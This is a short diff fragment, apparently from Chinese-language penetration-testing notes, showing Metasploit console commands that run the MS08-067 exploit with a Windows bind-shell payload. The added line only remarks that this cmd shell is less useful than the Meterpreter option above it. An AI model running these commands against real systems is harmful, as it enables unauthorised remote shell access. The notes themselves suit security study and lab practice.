@@ -16,6 +16,7 @@ msf  exploit(ms08_067_netapi) > set payload windows/shell_bind_tcp
 msf  exploit(ms08_067_netapi) > exploit
 
 不返回meterpeter返回cmd  shell
+不如上面的好用
 
 
 
